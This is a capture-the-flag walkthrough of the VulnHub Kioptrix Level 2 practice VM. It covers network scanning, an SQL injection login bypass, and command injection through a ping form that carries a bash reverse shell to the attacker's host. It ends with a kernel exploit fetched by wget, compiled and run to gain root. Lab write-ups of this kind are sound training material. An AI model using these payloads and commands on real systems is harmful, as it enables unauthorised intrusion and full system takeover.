---
layout: post
title: "VulnHub - Kioptrix Level 2"
date: 2022-02-09
categories: [VulnHub]
tags: [boot2root]
image: ../../assets/img/posts/Kioptrix Level 2/Kioptrix2.png

---

## Description

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. 

|**Box**|[Kioptrix Level 2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)|

---

We'll start with first discovering the IP address of the box using **netdiscover** tool,

```bash
sudo netdiscover -r 10.0.2.0/24
```

![netdiscover](../../assets/img/posts/Kioptrix Level 2/netdiscover.png)

Okay, so the IP address of the box is **10.0.2.67**.

Now, let's start port scanning with **nmap**,

```bash
sudo nmap -A -T4 -p- -oN nmap_scan 10.0.2.67
```

![nmap1](../../assets/img/posts/Kioptrix Level 2/nmap1.png)
![nmap2](../../assets/img/posts/Kioptrix Level 2/nmap2.png)

there are multiple ports open. Let's enumerate each one of them.

Let's find out what technologies are running on the machine using **whatweb** tool,

```bash
whatweb http://10.0.2.67
```

![whatweb](../../assets/img/posts/Kioptrix Level 2/whatweb.png)

it's running PHP programming language, has a password field (maybe login mechanism).

visit http://10.0.2.67,

![web1](../../assets/img/posts/Kioptrix Level 2/web1.png)

we got a admin login page. Let's try to break through in using SQLi.

We'll put username as `admin' or 1=1#` and password as `admin`(**any**)

![web2](../../assets/img/posts/Kioptrix Level 2/web2.png)

we'll get logged in as administrator,

![web3](../../assets/img/posts/Kioptrix Level 2/web3.png)

seems like this is a web console and we can ping any machines. Let's ping our own machine,

when **127.0.0.1** is entered in empty area, we'll get this result,

![web4](../../assets/img/posts/Kioptrix Level 2/web4.png)

we got ping result. This is a OS Command Execution Vulnerability and we can run other system commands as well on this web console.

Let's get to know which user we're by, `whoami`

![web5](../../assets/img/posts/Kioptrix Level 2/web5.png)

Let's start the netcat listener on kali terminal using `nc -nvlp 4444` and we'll put this one liner reverse shell in ping utility of website to get us a reverse shell when command gets executed.

```bash
127.0.0.1; bash -c 'exec bash -i &>/dev/tcp/10.0.2.15/4444 <&1'
```

![web6](../../assets/img/posts/Kioptrix Level 2/web6.png)

as soon as this command runs, we'll get back a reverse connection,

![shell1](../../assets/img/posts/Kioptrix Level 2/shell1.png)

we're apache user.

After enumeration, I found that there's nothing we can do to elevate our privileges to users like john or harold. 

**Privilege Escalation:** we'll escalate our privileges to super-user with help of enumeration. Let's first find out what is the system OS running,

```bash
cat /etc/*-release
```

![shell2](../../assets/img/posts/Kioptrix Level 2/shell2.png)

this box is running **CentOS 4.5 Final**.

Let's take a look at kernel version,

```bash
uname -mrs
```

![shell3](../../assets/img/posts/Kioptrix Level 2/shell3.png)

The kernel version of this box is **Linux 2.6.9-55.EL**. After doing some research on google, I found that this kernel is named as **IP_Append_data()**. Let's search this exploit on searchsploit,

```bash
searchsploit ip append data
```

![searchsploit](../../assets/img/posts/Kioptrix Level 2/searchsploit.png)

this is a C file exploit.

Let's download the exploit on our dir and start the python webserver using `python3 -m http.server 8000` and now we're going to upload this exploit on the box,

first navigate to /tmp directory because this directory has writable permissions and then we'll download this exploit using **wget** command,

```bash
wget http://10.0.2.15:8000/9542.c
```

Let's now compile this exploit using **gcc** compiler,

```bash
gcc -o 9542 9542.c
```

Now, let's run the exploit,

```bash
./9542
```

![shell4](../../assets/img/posts/Kioptrix Level 2/shell4.png)

doing `id` will show us that we're now ROOT user!!!.
